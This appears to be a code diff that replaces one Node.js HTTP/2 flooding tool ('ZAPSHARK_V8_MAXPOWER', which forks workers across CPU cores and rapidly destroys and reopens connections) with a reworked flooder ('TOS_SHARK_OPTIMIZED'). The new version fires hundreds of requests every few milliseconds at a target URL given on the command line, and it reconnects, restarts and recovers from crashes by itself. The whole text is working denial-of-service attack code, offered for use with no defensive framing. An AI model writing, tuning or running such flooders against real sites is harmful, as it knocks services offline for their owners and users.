@@ -1,178 +1,166 @@
 const http2 = require('http2');
-const cluster = require('cluster');
-const os = require('os');
+const { URL } = require('url');
 
-if (cluster.isMaster) {
-    const numCPUs = Math.max(1, os.cpus().length - 2);
-    
-    for (let i = 0; i < numCPUs; i++) {
-        cluster.fork();
+class TOS_SHARK_OPTIMIZED {
+    constructor(target) {
+        this.target = target;
+        this.running = true;
+        this.totalReqs = 0;
+        this.activeConns = 5; // REDUCED from 7
+        this.reqsPerBatch = 50; // REDUCED from 125
+        this.batchDelay = 10; // ms between batches
+        
+        this.colors = {
+            reset: '\x1b[0m',
+            magenta: '\x1b[35m',
+            green: '\x1b[92m',
+            red: '\x1b[91m'
+        };
+        
+        this.startEngine();
+        this.startAutoRestart();
     }
     
-    cluster.on('exit', (worker) => {
-        cluster.fork();
+    startEngine() {
+        // Single connection pool - more efficient
+        this.connPool = [];
+        for (let i = 0; i < this.activeConns; i++) {
+            this.createConnection(i);
+        }
+        
+        // Efficient batch scheduler
+        this.batchInterval = setInterval(() => {
+            if (!this.running) return;
+            this.sendEfficientBatch();
+        }, this.batchDelay);
+        
+        // Stats logger
+        this.logInterval = setInterval(() => {
+            console.log(`${this.colors.magenta}TOS-SHARK${this.colors.reset}:${this.colors.green}${this.totalReqs}${this.colors.reset}`);
+            this.totalReqs = 0;
+        }, 10000);
+    }
+    
+    createConnection(id) {
+        try {
+            const client = http2.connect(this.target, {
+                maxSessionMemory: 512 * 512, // REDUCED memory
+                peerMaxConcurrentStreams: 100
+            });
+            
+            client.on('error', () => {
+                setTimeout(() => this.createConnection(id), 1000);
+            });
+            
+            client.on('goaway', () => {
+                setTimeout(() => this.createConnection(id), 1000);
+            });
+            
+            this.connPool[id] = client;
+        } catch (e) {
+            setTimeout(() => this.createConnection(id), 2000);
+        }
+    }
+    
+    sendEfficientBatch() {
+        // Send minimal requests to reduce device load
+        for (let i = 0; i < this.activeConns; i++) {
+            const client = this.connPool[i];
+            if (client && client.socket && !client.destroyed) {
+                for (let j = 0; j < this.reqsPerBatch; j++) {
+                    this.sendLightRequest(client);
+                }
+            }
+        }
+    }
+    
+    sendLightRequest(client) {
+        try {
+            const req = client.request({
+                ':method': 'GET',
+                ':path': '/',
+                ':authority': new URL(this.target).hostname
+            });
+            
+            req.on('response', () => {
+                this.totalReqs++;
+                req.close(); // CLOSE IMMEDIATELY to free memory
+            });
+            
+            req.on('error', () => {
+                req.close();
+            });
+            
+            req.end();
+        } catch (e) {
+            // Silent fail
+        }
+    }
+    
+    startAutoRestart() {
+        // Auto-restart every 2 minutes to prevent GC crashes
+        setInterval(() => {
+            console.log(`${this.colors.green}[AUTO-RESTARTING]${this.colors.reset}`);
+            this.restartEngine();
+        }, 120000);
+    }
+    
+    restartEngine() {
+        // Clean restart
+        clearInterval(this.batchInterval);
+        clearInterval(this.logInterval);
+        
+        // Close old connections
+        this.connPool.forEach(client => {
+            try {
+                if (client && !client.destroyed) client.destroy();
+            } catch (e) {}
+        });
+        
+        // Restart fresh
+        setTimeout(() => {
+            this.totalReqs = 0;
+            this.startEngine();
+        }, 1000);
+    }
+    
+    stop() {
+        this.running = false;
+        clearInterval(this.batchInterval);
+        clearInterval(this.logInterval);
+        this.connPool.forEach(client => {
+            try {
+                if (client && !client.destroyed) client.destroy();
+            } catch (e) {}
+        });
+    }
+}
+
+// RUN WITH AUTO-RECOVERY
+if (require.main === module) {
+    process.on('uncaughtException', () => {
+        console.log('[*] Auto-recovering...');
+        setTimeout(() => main(), 3000);
     });
     
-} else {
-    class ZAPSHARK_V8_MAXPOWER {
-        constructor(targetUrl) {
-            this.targetUrl = targetUrl;
-            this.hostname = new URL(targetUrl).hostname;
-            this.totalRequests = 0;
-            
-            
-            this.clientCount = 5;
-            this.clients = [];
-            this.activeStreams = 0;
-            this.requestMap = new Map();
-            this.lastCleanup = Date.now();
-            
-            this.attackInterval = null;
-            this.resetIntervalObj = null;
+    process.on('unhandledRejection', () => {});
+    
+    require('v8').setFlagsFromString('--max-old-space-size=2048');
+    
+    function main() {
+        if (process.argv.length < 3) {
+            console.log('Usage: node tos.js https://target.com');
+            process.exit(1);
         }
-
-        initializeConnections() {
-            for (let i = 0; i < this.clientCount; i++) {
-                try {
-                    const client = http2.connect(this.targetUrl);
-                    client.setMaxListeners(1000);
-                    client.on('error', () => {});
-                    this.clients.push(client);
-                } catch (err) {}
-            }
-        }
-
-        createClient() {
-            try {
-                const client = http2.connect(this.targetUrl);
-                client.setMaxListeners(1000);
-                client.on('error', () => {});
-                return client;
-            } catch (err) {
-                return null;
-            }
-        }
-
-        performExtremeReset() {
-            if (this.clients.length > 0) {
-                const clientIndex = Math.floor(Math.random() * this.clients.length);
-                const client = this.clients[clientIndex];
-                
-                if (client) {
-                    try {
-                        client.destroy();
-                        const newClient = this.createClient();
-                        if (newClient) {
-                            this.clients[clientIndex] = newClient;
-                        }
-                    } catch (err) {}
-                }
-            }
-        }
-
-        cleanupStaleRequests() {
-            const now = Date.now();
-            if (now - this.lastCleanup > 5000) {
-                for (const [reqId, timestamp] of this.requestMap.entries()) {
-                    if (now - timestamp > 10000) {
-                        this.requestMap.delete(reqId);
-                    }
-                }
-                this.lastCleanup = now;
-            }
-        }
-
-        sendMaxRequests() {
-            if (this.clients.length === 0) return;
-            
-            this.cleanupStaleRequests();
-            
-            const streamsThisTick = 20;
-            
-            for (let i = 0; i < streamsThisTick; i++) {
-                const client = this.clients[Math.floor(Math.random() * this.clients.length)];
-                if (!client) continue;
-
-                try {
-                    this.activeStreams++;
-                    const reqId = Math.random().toString(36);
-                    this.requestMap.set(reqId, Date.now());
-                    
-                    const req = client.request({
-                        ':method': 'HEAD',
-                        ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5)
-                    });
-                    
-                    const cleanup = () => {
-                        this.activeStreams--;
-                        this.totalRequests++;
-                        this.requestMap.delete(reqId);
-                        req.removeAllListeners();
-                    };
-                    
-                    req.once('response', () => {
-                        req.destroy();
-                        cleanup();
-                    });
-                    
-                    req.once('error', () => {
-                        req.destroy();
-                        cleanup();
-                    });
-                    
-                    req.once('close', cleanup);
-                    
-                    req.end();
-                    
-                } catch (err) {
-                    this.activeStreams--;
-                    this.totalRequests++;
-                }
-            }
-        }
-
-        updateDisplay() {
-            process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
-        }
-
-        start() {
-            this.initializeConnections();
-            
-            setTimeout(() => {
-                this.resetIntervalObj = setInterval(() => {
-                    this.performExtremeReset();
-                }, 0.5);
-                
-                this.attackInterval = setInterval(() => {
-                    for (let batch = 0; batch < 3; batch++) {
-                        this.sendMaxRequests();
-                    }
-                    this.updateDisplay();
-                }, 0.1);
-                
-                setInterval(() => {
-                    if (global.gc) global.gc();
-                }, 30000);
-                
-            }, 2000);
-            
-            process.on('SIGINT', () => {
-                clearInterval(this.attackInterval);
-                clearInterval(this.resetIntervalObj);
-                this.clients.forEach(client => {
-                    try { client.destroy(); } catch (e) {}
-                });
-                this.requestMap.clear();
-                process.exit(0);
-            });
-        }
+        
+        const shark = new TOS_SHARK_OPTIMIZED(process.argv[2]);
+        
+        process.on('SIGINT', () => {
+            shark.stop();
+            console.log('\nStopped.');
+            process.exit(0);
+        });
     }
-
-    const target = process.argv[2];
-    if (!target || !target.startsWith('https://')) {
-        process.exit(1);
-    }
-
-    const shark = new ZAPSHARK_V8_MAXPOWER(target);
-    shark.start();
+    
+    main();
 }
